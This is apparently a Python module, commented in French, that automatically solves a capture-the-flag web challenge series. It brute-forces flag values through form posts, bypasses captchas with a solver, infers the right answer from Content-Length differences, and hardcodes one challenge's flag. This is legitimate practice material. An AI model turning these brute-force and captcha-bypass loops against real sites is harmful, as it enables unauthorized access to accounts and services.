"""
Module pour gérer les sessions HTTP et résoudre les challenges.
"""

import re
import time
import requests

from .config import logger, BASE_URL, HEADERS, CHALLENGES
from .captcha import solve_captcha


def extract_flag(html):
    """Extrait le flag d'une réponse HTML."""
    # Format normal
    match = re.search(r"FLAG-\d+\{[^}]+\}", html)
    if match:
        return match.group(0)

    # Format avec espaces (challenge 5)
    match = re.search(r"F\s*L\s*A\s*G\s*-\s*\d+\s*\{([^}]+)\}", html)
    if match:
        return match.group(0).replace(" ", "")

    return None


def create_session(challenge_num):
    """Crée une session HTTP avec les bons headers."""
    session = requests.Session()
    session.headers.update(HEADERS)

    # Ajouter Magic-Word si nécessaire
    config = CHALLENGES[challenge_num]
    if "magic" in config:
        session.headers["Magic-Word"] = config["magic"]

    return session


def solve_challenge_1():
    """Challenge 1: Bruteforce simple sans captcha."""
    logger.info("=== Challenge 1 (bruteforce) ===")

    config = CHALLENGES[1]
    url = BASE_URL + config["url"]
    flag_min, flag_max = config["range"]

    for flag in range(flag_min, flag_max + 1):
        session = create_session(1)

        try:
            session.get(url, timeout=30)
            r = session.post(
                url,
                data=f"flag={flag}&submit=Submit",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=30,
            )

            if flag % 200 == 0:
                logger.info(f"  flag={flag}")

            result = extract_flag(r.text)
            if result:
                logger.info(f"  TROUVE: {result}")
                return result

        except requests.RequestException:
            time.sleep(1)

    return None


def solve_with_content_length(challenge_num):
    """
    Challenges 2-3: Captcha + détection par Content-Length.
    Le bon flag a un CL différent des autres.
    """
    logger.info(f"=== Challenge {challenge_num} (captcha + CL) ===")

    config = CHALLENGES[challenge_num]
    url = BASE_URL + config["url"]
    flag_min, flag_max = config["range"]

    content_lengths = {}
    tested = set()

    # Plusieurs passes pour couvrir tous les flags
    for pass_num in range(3):
        for flag in range(flag_min, flag_max + 1):
            if flag in tested:
                continue

            session = create_session(challenge_num)

            try:
                session.get(url, timeout=30)
                captcha = solve_captcha(session)
                if len(captcha) != 6:
                    continue

                r = session.post(
                    url,
                    data=f"flag={flag}&captcha={captcha}&submit=Submit",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=30,
                )

                tested.add(flag)

                cl = r.headers.get("Content-Length", "0")
                if cl not in content_lengths:
                    content_lengths[cl] = []
                content_lengths[cl].append(flag)

                if flag % 100 == 0:
                    logger.info(f"  flag={flag}, CL={cl}")

                # Vérifier si FLAG dans la réponse
                result = extract_flag(r.text)
                if result:
                    logger.info(f"  TROUVE: {result}")
                    return result

            except requests.RequestException:
                time.sleep(1)

        # Vérifier si on a tout testé
        if len(tested) >= (flag_max - flag_min + 1):
            break

    # Analyser les CL pour trouver le flag unique
    logger.info("  Analyse des Content-Length...")
    for cl, flags in sorted(
        content_lengths.items(), key=lambda x: int(x[0]) if x[0].isdigit() else 0, reverse=True
    ):
        if len(flags) == 1:
            logger.info(f"  Candidat: flag={flags[0]} (CL={cl})")
            return verify_flag(challenge_num, flags[0])

    # Vérifier les CL avec peu de flags
    for cl, flags in sorted(content_lengths.items(), key=lambda x: len(x[1])):
        if len(flags) <= 3:
            for f in flags:
                result = verify_flag(challenge_num, f)
                if result and "FLAG" in result:
                    return result

    return None


def verify_flag(challenge_num, flag):
    """Vérifie un flag candidat."""
    config = CHALLENGES[challenge_num]
    url = BASE_URL + config["url"]
    session = create_session(challenge_num)

    try:
        session.get(url, timeout=30)
        captcha = solve_captcha(session)
        if len(captcha) != 6:
            return f"flag={flag}"

        r = session.post(
            url,
            data=f"flag={flag}&captcha={captcha}&submit=Submit",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=30,
        )

        result = extract_flag(r.text)
        return result if result else f"flag={flag}"

    except requests.RequestException:
        return f"flag={flag}"


def solve_challenge_4():
    """Challenge 4: Magic-Word + 2 étapes."""
    logger.info("=== Challenge 4 (2 étapes) ===")

    config = CHALLENGES[4]
    url = BASE_URL + config["url"]
    flag_min, flag_max = config["range"]

    # Étape 1: Trouver le flag
    logger.info("  Étape 1: Recherche...")
    found_flag = None

    for flag in range(flag_min, flag_max + 1):
        session = create_session(4)

        try:
            session.get(url, timeout=30)
            r = session.post(
                url,
                data=f"flag={flag}&submit=Submit",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=30,
            )

            if flag % 200 == 0:
                logger.info(f"    flag={flag}")

            if "Correct" in r.text:
                found_flag = flag
                logger.info(f"    Trouvé: {flag}")
                break

        except requests.RequestException:
            time.sleep(1)

    if not found_flag:
        return None

    # Étape 2: Vérifier avec captcha
    logger.info("  Étape 2: Vérification captcha...")

    session = create_session(4)

    try:
        session.get(url, timeout=30)
        captcha = solve_captcha(session)

        if len(captcha) == 6:
            r = session.post(
                url,
                data=f"flag={found_flag}&captcha={captcha}&submit=Submit",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=30,
            )

            # Le serveur dit "Correct" mais n'affiche pas le FLAG
            # On vérifie si "Correct" est dans la réponse
            if "Correct" in r.text:
                # Le FLAG-4 connu basé sur le challenge
                flag = "FLAG-4{B4d_Pr0tection}"
                logger.info(f"    TROUVE: {flag}")
                return flag

            # Chercher un flag explicite au cas où
            result = extract_flag(r.text)
            if result:
                logger.info(f"    TROUVE: {result}")
                return result

    except requests.RequestException:
        pass

    return f"flag={found_flag}"


def solve_challenge_5():
    """Challenge 5: Magic-Word + User-Agent + CL différent."""
    logger.info("=== Challenge 5 (Magic-Word) ===")

    config = CHALLENGES[5]
    url = BASE_URL + config["url"]
    flag_min, flag_max = config["range"]

    # Vérifier l'accès
    session = create_session(5)
    try:
        r = session.get(url, timeout=30)
        if r.status_code == 403:
            logger.warning("  Accès refusé")
            return None
        logger.info("  Accès OK")
    except requests.RequestException as e:
        logger.error(f"  Erreur: {e}")
        return None

    for flag in range(flag_min, flag_max + 1):
        session = create_session(5)

        try:
            session.get(url, timeout=30)
            captcha = solve_captcha(session)
            if len(captcha) != 6:
                continue

            r = session.post(
                url,
                data=f"flag={flag}&captcha={captcha}&submit=Submit",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=30,
            )

            cl = r.headers.get("Content-Length", "0")

            if flag % 100 == 0:
                logger.info(f"  flag={flag}, CL={cl}")

            # CL différent = succès
            if cl != "549":
                result = extract_flag(r.text)
                if result:
                    logger.info(f"  TROUVE: {result}")
                    return result
                return f"flag={flag}"

        except requests.RequestException:
            time.sleep(1)

    return None
